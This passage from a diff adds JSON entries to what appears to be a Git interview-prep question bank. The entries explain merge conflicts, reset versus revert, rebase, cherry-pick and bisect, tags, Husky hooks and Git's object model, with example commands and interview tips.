+          "code": "# Attempt to merge feature into main\ngit checkout main\ngit merge feature/auth\n# Auto-merging src/app.ts\n# CONFLICT (content): Merge conflict in src/app.ts\n# Automatic merge failed; fix conflicts and then commit.\n\n# Check which files have conflicts\ngit status\n# Unmerged paths:\n#   both modified:   src/app.ts\n\n# The conflict markers in src/app.ts look like:\n<<<<<<< HEAD\nconst port = 3000;\napp.listen(port);\n=======\nconst PORT = process.env.PORT || 8080;\napp.listen(PORT);\n>>>>>>> feature/auth\n\n# Resolution: Edit the file to keep what you want\nconst PORT = process.env.PORT || 3000;\napp.listen(PORT);\n# (Removed ALL conflict markers)\n\n# Stage the resolved file\ngit add src/app.ts\n\n# Complete the merge\ngit commit -m \"Merge feature/auth: use env PORT with fallback\"\n\n# If you want to abort the merge entirely\ngit merge --abort  # returns to state before merge",
+          "explanation": "The key steps: identify conflicts (git status), edit files to resolve (remove markers), git add resolved files, git commit. Use git merge --abort if you want to start over."
+        },
+        {
+          "title": "Using Merge Tools",
+          "code": "# Configure a merge tool\ngit config --global merge.tool vscode\ngit config --global mergetool.vscode.cmd 'code --wait $MERGED'\n\n# Launch merge tool for conflicts\ngit mergetool\n# Opens each conflicted file in your configured tool\n# Three-way merge view:\n#   LOCAL  (your branch)  |  BASE (common ancestor)  |  REMOTE (incoming)\n#                          MERGED (result)\n\n# VS Code built-in merge editor shows:\n# Accept Current Change  (keep yours)\n# Accept Incoming Change (keep theirs)\n# Accept Both Changes    (keep both)\n# Compare Changes        (side by side)\n\n# After resolving in the tool:\ngit add .\ngit commit\n\n# Clean up .orig backup files\ngit config --global mergetool.keepBackup false\n\n# Reuse recorded resolution (rerere)\ngit config --global rerere.enabled true\n# Git remembers how you resolved a conflict\n# and auto-applies the same resolution next time",
+          "explanation": "Merge tools provide a visual three-way merge. VS Code's built-in merge editor is excellent. Enable rerere to auto-resolve repeated conflicts."
+        },
+        {
+          "title": "Preventing and Managing Conflicts",
+          "code": "# Strategy 1: Keep your branch up to date\ngit checkout feature/auth\ngit merge main  # or: git rebase main\n# Resolving small conflicts often is easier than one big conflict\n\n# Strategy 2: Check for conflicts before merging\ngit merge --no-commit --no-ff feature/auth\n# Performs merge but does NOT commit\ngit diff --staged  # review the result\ngit merge --abort  # cancel if needed\n# OR\ngit commit         # finalize if happy\n\n# Strategy 3: Use merge strategies\ngit merge -X ours feature/auth    # prefer our changes on conflict\ngit merge -X theirs feature/auth  # prefer their changes on conflict\n# WARNING: these auto-resolve, which can discard valid changes\n\n# Rebase conflict resolution\ngit rebase main\n# CONFLICT in src/app.ts\n# Fix the file, then:\ngit add src/app.ts\ngit rebase --continue\n# If multiple commits conflict, repeat for each\n# To abort: git rebase --abort\n\n# See common ancestor of two branches\ngit merge-base main feature/auth\n# Returns the commit hash where branches diverged",
+          "explanation": "Frequent small merges from main into your feature branch prevent large conflicts. Use --no-commit to preview merge results before committing."
+        }
+      ],
+      "notes": [
+        "Never commit files with conflict markers still in them",
+        "git rerere (reuse recorded resolution) saves time on repeated conflicts",
+        "Rebase conflicts must be resolved for each commit being replayed, not just once"
+      ],
+      "followUps": [
+        "How do you handle conflicts during a rebase vs a merge?",
+        "What is a three-way merge?",
+        "How does git rerere work?"
+      ],
+      "interviewTips": [
+        "Walk through a real conflict resolution step by step - interviewers want process",
+        "Mention prevention strategies: short-lived branches, frequent merges from main",
+        "Know the difference between merge conflicts and rebase conflicts"
+      ]
+    }
+  },
+  {
+    "id": "git-reset-revert",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 8,
+    "title": "Git Reset vs Revert vs Checkout",
+    "difficulty": "Intermediate",
+    "type": "Concept",
+    "concepts": ["git reset", "git revert", "git checkout", "git restore", "HEAD", "Detached HEAD"],
+    "content": {
+      "question": "Explain the differences between git reset, git revert, and git checkout. When would you use each?",
+      "answer": "These three commands all undo changes but in fundamentally different ways:\n\ngit reset: Moves the branch pointer backward, effectively erasing commits from history. Three modes: --soft (keeps changes staged), --mixed (keeps changes unstaged, default), --hard (discards all changes). Use only on local, unpushed commits because it rewrites history.\n\ngit revert: Creates a NEW commit that undoes the changes of a previous commit. History is preserved and a new commit is added. Safe for shared branches because it does not rewrite history.\n\ngit checkout (and modern git restore/git switch): Switches branches or restores files. git checkout can move HEAD to a specific commit (detached HEAD state). Modern Git split this into git switch (for branches) and git restore (for files) to avoid confusion.\n\nRule of thumb: Use reset for local cleanup, revert for undoing published commits, and restore/switch for navigating the working directory.",
+      "codeExamples": [
+        {
+          "title": "Git Reset Modes",
+          "code": "# Current state: A - B - C - D (HEAD)\n\n# --soft: move HEAD back, keep changes STAGED\ngit reset --soft HEAD~1\n# State: A - B - C (HEAD)\n# D's changes are in staging area, ready to recommit\n# Use case: redo a commit message or combine commits\n\n# --mixed (default): move HEAD back, keep changes UNSTAGED\ngit reset HEAD~1\n# State: A - B - C (HEAD)\n# D's changes are in working directory, not staged\n# Use case: rework changes before committing\n\n# --hard: move HEAD back, DISCARD all changes\ngit reset --hard HEAD~1\n# State: A - B - C (HEAD)\n# D's changes are GONE (recoverable via reflog)\n# Use case: completely abandon recent work\n\n# Reset to a specific commit\ngit reset --hard a1b2c3d\n\n# Reset a single file (unstage it)\ngit reset HEAD -- src/app.ts\n# Modern equivalent:\ngit restore --staged src/app.ts\n\n# RECOVERY after accidental hard reset\ngit reflog\n# Find the lost commit hash\ngit reset --hard <lost-hash>",
+          "explanation": "Think of reset modes as: --soft (undo commit only), --mixed (undo commit + staging), --hard (undo everything). Always check reflog if you reset --hard by mistake."
+        },
+        {
+          "title": "Git Revert - Safe Undo",
+          "code": "# Revert a single commit (creates new commit)\ngit revert a1b2c3d\n# Opens editor for the revert commit message\n# Default: \"Revert 'feat: add auth module'\"\n\n# Revert without auto-committing\ngit revert --no-commit a1b2c3d\ngit revert --no-commit e4f5g6h\n# Both reverts are staged but not committed\n# Review changes, then:\ngit commit -m \"Revert auth and CORS changes\"\n\n# Revert a merge commit\n# Merge commits have 2 parents: -m specifies which to keep\ngit revert -m 1 <merge-commit-hash>\n# -m 1 means keep the first parent (usually main)\n# -m 2 means keep the second parent (the merged branch)\n\n# Revert a range of commits\ngit revert --no-commit HEAD~3..HEAD\n# Reverts the last 3 commits in one batch\ngit commit -m \"Revert last 3 commits: rollback auth feature\"\n\n# If revert has conflicts, resolve them:\n# 1. Fix conflict markers\n# 2. git add <files>\n# 3. git revert --continue\n# Or abort: git revert --abort",
+          "explanation": "Revert is the safe way to undo on shared branches. It never rewrites history. Reverting a merge commit requires -m to specify which parent to keep."
+        },
+        {
+          "title": "Checkout, Switch, and Restore",
+          "code": "# OLD WAY: git checkout did too many things\ngit checkout main             # switch branch\ngit checkout -b new-branch    # create + switch\ngit checkout -- file.txt      # restore file\ngit checkout a1b2c3d          # detached HEAD\n\n# MODERN WAY: separate commands\n# Switch branches\ngit switch main\ngit switch -c new-branch      # create + switch\ngit switch -               # switch to previous branch\n\n# Restore files\ngit restore src/app.ts         # discard unstaged changes\ngit restore --staged src/app.ts # unstage (keep changes)\ngit restore --source=HEAD~1 src/app.ts  # restore from older commit\ngit restore --source=main -- src/app.ts # restore from another branch\n\n# Detached HEAD state\ngit checkout a1b2c3d\n# HEAD is not on any branch\n# You can look around, make experimental commits\n# To keep changes: create a branch\ngit switch -c keep-this-work\n# To discard: just switch back\ngit switch main\n\n# Restore all files to last commit (DANGEROUS)\ngit restore .\n# Equivalent to old: git checkout -- .",
+          "explanation": "Modern Git uses git switch for branches and git restore for files. This eliminates the confusion of git checkout doing multiple unrelated things."
+        }
+      ],
+      "notes": [
+        "Never git reset --hard on commits that have been pushed to a shared branch",
+        "git revert on a merge commit requires -m to specify the mainline parent",
+        "git switch and git restore are the modern replacements for git checkout"
+      ],
+      "followUps": [
+        "What is a detached HEAD state and how do you fix it?",
+        "How would you undo a revert?",
+        "What happens if you reset --hard and then push?"
+      ],
+      "interviewTips": [
+        "Draw the three reset modes and their effects on working dir / staging / history",
+        "Always recommend revert for shared branches - shows team awareness",
+        "Knowing git switch and git restore shows you keep up with modern Git"
+      ]
+    }
+  },
+  {
+    "id": "git-rebase",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 9,
+    "title": "Git Rebase & Interactive Rebase",
+    "difficulty": "Intermediate",
+    "type": "Coding",
+    "concepts": ["git rebase", "Interactive Rebase", "Squash", "Fixup", "Reword", "Rebase Onto"],
+    "content": {
+      "question": "Explain git rebase in depth. What is interactive rebase and how do you use it to clean up commit history?",
+      "answer": "git rebase takes a series of commits and replays them on top of another base commit. Unlike merge, which creates a merge commit preserving the branching structure, rebase produces a clean, linear history as if you had made your changes starting from the latest point on the target branch.\n\nInteractive rebase (git rebase -i) is one of Git's most powerful features. It lets you rewrite local commit history by reordering, editing, squashing, splitting, or dropping commits. Common operations:\n- pick: keep the commit as-is\n- reword: change the commit message\n- squash: combine with the previous commit, edit the message\n- fixup: combine with previous commit, discard the message\n- edit: pause to amend the commit\n- drop: remove the commit entirely\n\nThe golden rule: never rebase commits that have been pushed to a shared branch. Rebase rewrites commit hashes, which creates divergent histories for anyone who has already pulled those commits. Use rebase only on your local, unpushed feature branches.",
+      "codeExamples": [
+        {
+          "title": "Basic Rebase",
+          "code": "# Before rebase:\n# main:    A - B - C - D\n#                 \\\n# feature:         E - F - G\n\n# Rebase feature onto latest main\ngit checkout feature/auth\ngit rebase main\n\n# After rebase:\n# main:    A - B - C - D\n#                       \\\n# feature:               E' - F' - G'\n# (E', F', G' are NEW commits with new hashes)\n\n# Then fast-forward merge on main\ngit checkout main\ngit merge feature/auth\n# Result: A - B - C - D - E' - F' - G' (linear!)\n\n# If conflicts during rebase:\n# 1. Fix the conflict in the file\n# 2. git add <resolved-files>\n# 3. git rebase --continue\n# Repeat for each conflicting commit\n\n# Abort rebase (return to pre-rebase state)\ngit rebase --abort\n\n# Skip a conflicting commit\ngit rebase --skip",
+          "explanation": "Rebase replays your commits one by one onto the new base. If any commit conflicts, you resolve it and continue. The result is a clean linear history."
+        },
+        {
+          "title": "Interactive Rebase",
+          "code": "# Rewrite last 4 commits\ngit rebase -i HEAD~4\n\n# Editor opens with:\n# pick a1b2c3d feat: add login form\n# pick e4f5g6h fix: typo in login\n# pick i7j8k9l fix: another typo\n# pick m0n1o2p feat: add validation\n\n# Squash typo fixes into the main commit:\n# pick a1b2c3d feat: add login form\n# fixup e4f5g6h fix: typo in login\n# fixup i7j8k9l fix: another typo\n# pick m0n1o2p feat: add validation\n# Result: 2 clean commits instead of 4\n\n# Reorder commits (just move lines):\n# pick m0n1o2p feat: add validation\n# pick a1b2c3d feat: add login form\n\n# Edit a commit message:\n# reword a1b2c3d feat: add login form\n# (Editor opens to change the message)\n\n# Edit a commit's content:\n# edit a1b2c3d feat: add login form\n# (Pauses at that commit, you make changes)\n# git add .\n# git commit --amend\n# git rebase --continue\n\n# Drop a commit:\n# drop e4f5g6h fix: typo in login\n# (or just delete the line)",
+          "explanation": "Interactive rebase is your commit cleanup tool. Squash noise commits, reword messages, reorder for logical grouping. Always do this BEFORE pushing."
+        },
+        {
+          "title": "Advanced Rebase Techniques",
+          "code": "# Rebase onto: move branch to a different base\n# Before:\n# main:     A - B - C\n#                \\\n# feature:        D - E\n#                     \\\n# sub-feature:         F - G\n\n# Move sub-feature directly onto main (skip feature)\ngit rebase --onto main feature sub-feature\n# After:\n# main:     A - B - C\n#                |   \\\n# feature:  D - E    \\\n# sub-feature:        F' - G'\n\n# Autosquash: auto-arrange fixup commits\n# When committing fixes:\ngit commit --fixup=a1b2c3d\n# Creates: \"fixup! feat: add login form\"\n\n# Later, interactive rebase auto-sorts them:\ngit rebase -i --autosquash HEAD~5\n# The fixup commit is automatically placed after its target\n\n# Enable autosquash by default\ngit config --global rebase.autosquash true\n\n# Rebase preserving merge commits\ngit rebase --rebase-merges main\n# (replaces deprecated --preserve-merges)",
+          "explanation": "--onto lets you transplant a branch to a completely different base. --autosquash + --fixup workflow is how professionals keep clean history while developing."
+        }
+      ],
+      "notes": [
+        "Never rebase commits that have been pushed and shared with others",
+        "git commit --fixup + rebase --autosquash is a professional workflow pattern",
+        "If rebase goes wrong, git reflog can recover the pre-rebase state"
+      ],
+      "followUps": [
+        "What happens if you rebase pushed commits and someone has already pulled?",
+        "How do you split a commit using interactive rebase?",
+        "What is rebase --onto and when would you use it?"
+      ],
+      "interviewTips": [
+        "Explain the golden rule of rebase upfront - never rebase shared commits",
+        "Demonstrate the fixup/autosquash workflow - it is a sign of an experienced developer",
+        "Know how to resolve conflicts during rebase vs during merge"
+      ]
+    }
+  },
+  {
+    "id": "git-cherry-bisect",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 10,
+    "title": "Cherry-Pick & Bisect",
+    "difficulty": "Intermediate",
+    "type": "Coding",
+    "concepts": ["git cherry-pick", "git bisect", "Selective Commits", "Bug Hunting", "Binary Search"],
+    "content": {
+      "question": "Explain git cherry-pick and git bisect. When would you use each, and what are their limitations?",
+      "answer": "git cherry-pick applies the changes introduced by a specific commit onto your current branch, creating a new commit with the same changes but a different hash. It is useful when you need a specific fix from another branch without merging the entire branch. Common scenarios include back-porting a hotfix from main to a release branch or pulling a single feature commit into your branch.\n\ngit bisect performs a binary search through your commit history to find the exact commit that introduced a bug. You mark a known good commit and a known bad commit, and Git checks out the midpoint for you to test. You then mark it good or bad, and Git narrows the search by half each time. For N commits, bisect finds the culprit in roughly log2(N) steps.\n\nCherry-pick limitations: it creates duplicate commits with different hashes, which can cause confusion if the original branch is later merged. Bisect limitations: it requires a reproducible test for the bug, and works best when each commit is a complete, buildable state.",
+      "codeExamples": [
+        {
+          "title": "Cherry-Pick Operations",
+          "code": "# Apply a specific commit to the current branch\ngit cherry-pick a1b2c3d\n# Creates a NEW commit with the same changes but different hash\n\n# Cherry-pick without committing (stage changes only)\ngit cherry-pick --no-commit a1b2c3d\ngit cherry-pick --no-commit e4f5g6h\n# Review combined changes, then commit once:\ngit commit -m \"Backport: auth fix and CORS fix\"\n\n# Cherry-pick a range of commits\ngit cherry-pick a1b2c3d..e4f5g6h\n# Applies all commits AFTER a1b2c3d up to and including e4f5g6h\n\n# Cherry-pick inclusive of both endpoints\ngit cherry-pick a1b2c3d^..e4f5g6h\n\n# If cherry-pick conflicts:\n# 1. Resolve the conflict in the file\n# 2. git add <resolved-files>\n# 3. git cherry-pick --continue\n# Or abort: git cherry-pick --abort\n\n# Real-world scenario: hotfix backport\ngit checkout release/2.0\ngit cherry-pick main~3  # apply the hotfix from main\ngit push origin release/2.0",
+          "explanation": "Cherry-pick copies a commit's changes to your branch. Use --no-commit to combine multiple cherry-picks into a single commit. Always note which commits were cherry-picked to avoid confusion."
+        },
+        {
+          "title": "Git Bisect for Bug Hunting",
+          "code": "# Start bisecting\ngit bisect start\n\n# Mark the current commit as bad (has the bug)\ngit bisect bad\n\n# Mark a known good commit (did not have the bug)\ngit bisect good v1.0.0\n# Bisecting: 15 revisions left to test (roughly 4 steps)\n\n# Git checks out the midpoint commit\n# Test your application, then mark it:\ngit bisect good  # if the bug is NOT present\n# OR\ngit bisect bad   # if the bug IS present\n\n# Repeat until Git identifies the first bad commit:\n# a1b2c3d is the first bad commit\n# commit a1b2c3d\n# Author: John\n# Date: Mon Jan 15\n#     feat: change auth validation\n\n# End the bisect session\ngit bisect reset\n# Returns to the branch you were on before\n\n# View bisect log\ngit bisect log\n# Shows all good/bad markings for reference",
+          "explanation": "Bisect uses binary search: for 1000 commits, it finds the bug in about 10 steps instead of checking all 1000. Mark good/bad at each step and Git narrows down automatically."
+        },
+        {
+          "title": "Automated Bisect with Scripts",
+          "code": "# Automate bisect with a test script\ngit bisect start HEAD v1.0.0\ngit bisect run npm test\n# Git runs 'npm test' at each midpoint\n# Exit code 0 = good, non-zero = bad\n# Fully automatic bug finding!\n\n# Use a custom test script\ngit bisect run ./test-for-bug.sh\n# test-for-bug.sh:\n#!/bin/bash\n# npm run build && node -e \"require('./dist').validate('test')\"\n# Exit 0 if OK, exit 1 if bug exists\n\n# Skip a commit that cannot be tested (broken build)\ngit bisect skip\n# Git picks a nearby commit instead\n\n# Bisect with paths (only check specific files)\ngit bisect start -- src/auth/\n# Only considers commits that touched src/auth/",
+          "explanation": "Automated bisect is extremely powerful. Write a small script that exits 0 for good and non-zero for bad, and Git finds the exact breaking commit hands-free."
+        }
+      ],
+      "notes": [
+        "Cherry-picked commits have different hashes than originals, which can cause duplicates on merge",
+        "git bisect run automates the process entirely if you have a test script",
+        "Use git bisect skip when a commit cannot be built or tested"
+      ],
+      "followUps": [
+        "What problems can arise from cherry-picking commits that are later merged?",
+        "How does git bisect handle merge commits?",
+        "Can you cherry-pick a merge commit, and how?"
+      ],
+      "interviewTips": [
+        "Describe a real scenario where cherry-pick saved time, like backporting a hotfix",
+        "Mention automated bisect with run - it shows you value efficient debugging",
+        "Know that cherry-pick on merge commits requires -m flag, same as revert"
+      ]
+    }
+  },
+  {
+    "id": "git-tags",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 11,
+    "title": "Git Tags & Releases",
+    "difficulty": "Beginner",
+    "type": "Coding",
+    "concepts": ["git tag", "Lightweight Tags", "Annotated Tags", "Semantic Versioning", "Releases"],
+    "content": {
+      "question": "What are Git tags? Explain the difference between lightweight and annotated tags, and how they relate to release management.",
+      "answer": "Git tags are references that point to specific commits, typically used to mark release points (v1.0.0, v2.1.3, etc.). Unlike branches, tags do not move when new commits are made. They are permanent bookmarks in your history.\n\nThere are two types:\n1. Lightweight tags: Simply a pointer to a commit. No metadata, no message. Like a branch that never moves.\n2. Annotated tags: Full Git objects with tagger name, email, date, and a message. Can be GPG-signed. These are recommended for releases because they carry context about who tagged it and why.\n\nTags work hand-in-hand with Semantic Versioning (SemVer): MAJOR.MINOR.PATCH. MAJOR for breaking changes, MINOR for new features (backward-compatible), PATCH for bug fixes. Tags are also the basis for GitHub/GitLab Releases, which attach binaries and changelogs to a tagged commit.",
+      "codeExamples": [
+        {
+          "title": "Creating and Managing Tags",
+          "code": "# Lightweight tag (just a pointer)\ngit tag v1.0.0\n\n# Annotated tag (recommended for releases)\ngit tag -a v1.0.0 -m \"Release 1.0.0: initial stable release\"\n\n# Tag a specific past commit\ngit tag -a v0.9.0 -m \"Beta release\" a1b2c3d\n\n# List all tags\ngit tag\n# v0.9.0\n# v1.0.0\n\n# List tags matching a pattern\ngit tag -l \"v1.*\"\n\n# Show tag details\ngit show v1.0.0\n# tag v1.0.0\n# Tagger: John <john@example.com>\n# Date:   Mon Jan 15 10:00:00 2024\n# Release 1.0.0: initial stable release\n# commit a1b2c3d ...\n\n# Delete a local tag\ngit tag -d v1.0.0\n\n# Delete a remote tag\ngit push origin --delete v1.0.0",
+          "explanation": "Always use annotated tags (-a) for releases. Lightweight tags are fine for temporary local markers. Use git show to inspect tag details."
+        },
+        {
+          "title": "Pushing Tags and Releases",
+          "code": "# Push a specific tag to remote\ngit push origin v1.0.0\n\n# Push all tags at once\ngit push --tags\n\n# Push only annotated tags (skip lightweight)\ngit push --follow-tags\n\n# Create a GitHub release with gh CLI\ngh release create v1.0.0 \\\n  --title \"Release 1.0.0\" \\\n  --notes \"## What's New\n- User authentication\n- Job posting CRUD\n- ATS scoring engine\" \\\n  ./dist/app.zip\n\n# List releases\ngh release list\n\n# Download a release asset\ngh release download v1.0.0\n\n# Checkout a specific tag\ngit checkout v1.0.0\n# Warning: detached HEAD state\n# Create a branch if you need to make changes:\ngit checkout -b hotfix/v1.0.1 v1.0.0",
+          "explanation": "Tags must be explicitly pushed to remote. Use --follow-tags to only push annotated tags. GitHub Releases are built on top of Git tags."
+        },
+        {
+          "title": "Semantic Versioning Workflow",
+          "code": "# Semantic Versioning: MAJOR.MINOR.PATCH\n# 1.0.0 → 1.0.1 (patch: bug fix)\n# 1.0.0 → 1.1.0 (minor: new feature, backward compatible)\n# 1.0.0 → 2.0.0 (major: breaking change)\n\n# Typical release workflow:\n# 1. Update version in package.json\nnpm version patch  # 1.0.0 → 1.0.1 (auto-creates tag)\nnpm version minor  # 1.0.0 → 1.1.0\nnpm version major  # 1.0.0 → 2.0.0\n\n# npm version automatically:\n# - Updates package.json version\n# - Creates a git commit\n# - Creates a git tag (v1.0.1)\n\n# 2. Push with tags\ngit push --follow-tags\n\n# Pre-release tags\ngit tag -a v2.0.0-beta.1 -m \"Beta 1 for v2.0.0\"\ngit tag -a v2.0.0-rc.1 -m \"Release candidate 1\"\n\n# Sort tags by version\ngit tag --sort=-v:refname\n# v2.0.0-rc.1\n# v2.0.0-beta.1\n# v1.1.0\n# v1.0.1\n# v1.0.0",
+          "explanation": "npm version automates the tag+commit workflow. SemVer communicates the nature of changes to users. Pre-release tags (beta, rc) signal stability level."
+        }
+      ],
+      "notes": [
+        "Tags must be explicitly pushed with git push --tags or git push origin <tagname>",
+        "Annotated tags store metadata and are recommended for releases over lightweight tags",
+        "npm version automatically creates a commit and tag following SemVer"
+      ],
+      "followUps": [
+        "What is the difference between a tag and a branch?",
+        "How do you handle hotfixes on a tagged release?",
+        "What are pre-release version tags and when would you use them?"
+      ],
+      "interviewTips": [
+        "Know Semantic Versioning inside and out - it is expected knowledge for any developer",
+        "Mention annotated vs lightweight and when to use each",
+        "Relate tags to CI/CD: tags often trigger release pipelines"
+      ]
+    }
+  },
+  {
+    "id": "git-hooks",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 12,
+    "title": "Git Hooks",
+    "difficulty": "Intermediate",
+    "type": "Coding",
+    "concepts": ["Git Hooks", "pre-commit", "pre-push", "Husky", "lint-staged", "Automation"],
+    "content": {
+      "question": "What are Git hooks? How do you use them to enforce code quality in a team?",
+      "answer": "Git hooks are scripts that Git executes automatically before or after specific events like commit, push, or merge. They live in the .git/hooks/ directory and can be written in any scripting language (bash, Python, Node.js, etc.).\n\nCommon client-side hooks:\n- pre-commit: Runs before a commit is created. Used for linting, formatting, and running tests.\n- commit-msg: Validates commit message format (e.g., Conventional Commits).\n- pre-push: Runs before pushing. Used for running full test suites.\n- prepare-commit-msg: Pre-populates commit messages.\n\nServer-side hooks:\n- pre-receive: Runs on the server before accepting a push. Can enforce branch protection.\n- post-receive: Triggers after push is accepted. Used for deployment or notifications.\n\nThe challenge with Git hooks is that they are not version-controlled (they live in .git/). Tools like Husky solve this by letting you define hooks in package.json or config files that are committed to the repo. Combined with lint-staged, you can run linters only on staged files for speed.",
+      "codeExamples": [
+        {
+          "title": "Setting Up Husky + lint-staged",
+          "code": "# Install Husky and lint-staged\nnpm install --save-dev husky lint-staged\n\n# Initialize Husky\nnpx husky init\n# Creates .husky/ directory with a pre-commit hook\n\n# Edit .husky/pre-commit\n#!/bin/sh\nnpx lint-staged\n\n# Add lint-staged config to package.json\n# package.json:\n{\n  \"lint-staged\": {\n    \"*.{ts,tsx}\": [\n      \"eslint --fix\",\n      \"prettier --write\"\n    ],\n    \"*.{css,json,md}\": [\n      \"prettier --write\"\n    ]\n  }\n}\n\n# Now on every commit:\n# 1. Only staged files are checked (fast!)\n# 2. ESLint fixes auto-fixable issues\n# 3. Prettier formats the code\n# 4. Fixed files are re-staged automatically\n# 5. If any errors remain, commit is blocked",
+          "explanation": "Husky makes hooks version-controlled. lint-staged runs linters only on staged files, keeping pre-commit fast even in large projects."
+        },
+        {
+          "title": "Custom Git Hooks",
+          "code": "# .husky/commit-msg - enforce Conventional Commits\n#!/bin/sh\ncommit_msg=$(cat \"$1\")\npattern=\"^(feat|fix|docs|style|refactor|test|chore)(\\(.+\\))?: .{1,72}$\"\nif ! echo \"$commit_msg\" | grep -qE \"$pattern\"; then\n  echo \"ERROR: Commit message must follow Conventional Commits format\"\n  echo \"Example: feat(auth): add login endpoint\"\n  echo \"Types: feat, fix, docs, style, refactor, test, chore\"\n  exit 1\nfi\n\n# .husky/pre-push - run tests before pushing\n#!/bin/sh\necho \"Running tests before push...\"\nnpm test\nif [ $? -ne 0 ]; then\n  echo \"Tests failed. Push aborted.\"\n  exit 1\nfi\n\n# Native Git hook (without Husky)\n# Create: .git/hooks/pre-commit\n#!/bin/bash\necho \"Running pre-commit checks...\"\nnpm run lint\nnpm run typecheck\n# Make executable: chmod +x .git/hooks/pre-commit",
+          "explanation": "commit-msg hooks enforce message conventions. pre-push hooks catch issues before they reach the remote. Native hooks work but are not shared with the team."
+        },
+        {
+          "title": "Advanced Hook Patterns",
+          "code": "# Prevent committing to main directly\n# .husky/pre-commit\n#!/bin/sh\nbranch=$(git rev-parse --abbrev-ref HEAD)\nif [ \"$branch\" = \"main\" ] || [ \"$branch\" = \"master\" ]; then\n  echo \"ERROR: Direct commits to $branch are not allowed.\"\n  echo \"Create a feature branch and submit a PR.\"\n  exit 1\nfi\nnpx lint-staged\n\n# Check for debug statements\n#!/bin/sh\nif git diff --cached --diff-filter=ACM | grep -n 'console\\.log\\|debugger\\|TODO'; then\n  echo \"WARNING: Found debug statements in staged files.\"\n  echo \"Remove them or use --no-verify to bypass.\"\n  exit 1\nfi\n\n# Skip hooks when needed (use sparingly)\ngit commit --no-verify -m \"hotfix: emergency patch\"\ngit push --no-verify\n\n# List available hook types\nls .git/hooks/\n# applypatch-msg  pre-applypatch  pre-commit\n# commit-msg      pre-merge-commit pre-push\n# post-update     pre-rebase      prepare-commit-msg",
+          "explanation": "Branch protection in hooks prevents accidental commits to main. Debug statement detection catches common mistakes. Use --no-verify only for genuine emergencies."
+        }
+      ],
+      "notes": [
+        "Hooks in .git/hooks/ are not version-controlled - use Husky to share hooks with the team",
+        "lint-staged runs linters only on staged files, making pre-commit hooks fast",
+        "--no-verify bypasses hooks but should only be used in emergencies"
+      ],
+      "followUps": [
+        "What is the difference between client-side and server-side hooks?",
+        "How do you handle hooks in a monorepo?",
+        "What happens if a pre-commit hook fails?"
+      ],
+      "interviewTips": [
+        "Mention Husky and lint-staged by name - they are industry-standard tools",
+        "Explain how hooks enforce team standards without relying on individual discipline",
+        "Know that hooks can be bypassed with --no-verify and when that is acceptable"
+      ]
+    }
+  },
+  {
+    "id": "git-internals",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 13,
+    "title": "Git Internals (objects, refs)",
+    "difficulty": "Advanced",
+    "type": "Concept",
+    "concepts": ["Git Objects", "Blob", "Tree", "Commit Object", "Refs", "SHA-1", "Pack Files"],
+    "content": {
+      "question": "Explain Git's internal object model. What are blobs, trees, and commit objects? How does Git store data?",
+      "answer": "Git is fundamentally a content-addressable filesystem. Every piece of data is stored as an object identified by its SHA-1 hash. There are four types of objects:\n\n1. Blob: Stores file contents (no filename, no metadata). Two files with identical content share the same blob.\n2. Tree: Represents a directory. Contains pointers to blobs (files) and other trees (subdirectories), along with filenames and permissions.\n3. Commit: Points to a tree (the project snapshot), parent commit(s), author, committer, timestamp, and message.\n4. Tag: An annotated tag object pointing to a commit with additional metadata.\n\nRefs are human-readable names that point to commit hashes. Branches are refs in .git/refs/heads/, tags in .git/refs/tags/, and remotes in .git/refs/remotes/. HEAD is a special ref that points to the current branch (or directly to a commit in detached HEAD state).\n\nGit stores objects initially as loose objects (one file per object in .git/objects/). Periodically, Git packs them into pack files for efficiency, using delta compression to store only differences between similar objects.",
+      "codeExamples": [
+        {
+          "title": "Exploring Git Objects",
+          "code": "# See the type of any object\ngit cat-file -t HEAD\n# commit\n\n# See the content of a commit object\ngit cat-file -p HEAD\n# tree 4b825dc642cb6eb9a060e54bf899d4e769ad93a2\n# parent a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\n# author John <john@example.com> 1705312200 +0000\n# committer John <john@example.com> 1705312200 +0000\n#\n# feat: add user authentication\n\n# See the tree object (directory listing)\ngit cat-file -p HEAD^{tree}\n# 100644 blob abc123... .gitignore\n# 100644 blob def456... package.json\n# 040000 tree 789abc... src\n\n# See a blob (file contents)\ngit cat-file -p abc123\n# node_modules/\n# .env\n# dist/\n\n# Get the hash of any content\necho \"hello\" | git hash-object --stdin\n# ce013625030ba8dba906f756967f9e9ca394464a",
+          "explanation": "git cat-file is the Swiss Army knife for inspecting objects. -t shows the type, -p shows the content. Every object is identified by its SHA-1 hash."
+        },
+        {
+          "title": "Understanding Refs",
+          "code": "# HEAD points to the current branch\ncat .git/HEAD\n# ref: refs/heads/main\n\n# Branch is just a file containing a commit hash\ncat .git/refs/heads/main\n# a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\n\n# Tags are also refs\ncat .git/refs/tags/v1.0.0\n# e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3\n\n# Remote tracking branches\ncat .git/refs/remotes/origin/main\n# a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\n\n# Symbolic refs\ngit symbolic-ref HEAD\n# refs/heads/main\n\n# Detached HEAD: HEAD points directly to a commit\ngit checkout a1b2c3d\ncat .git/HEAD\n# a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\n# (no \"ref:\" prefix = detached)\n\n# Packed refs (optimization for many refs)\ncat .git/packed-refs\n# a1b2c3d... refs/tags/v1.0.0\n# e4f5g6h... refs/remotes/origin/main",
+          "explanation": "Branches are simply files containing commit hashes. This is why branching in Git is instant and cheap - it is just writing 40 characters to a file."
+        },
+        {
+          "title": "Git Storage and Garbage Collection",
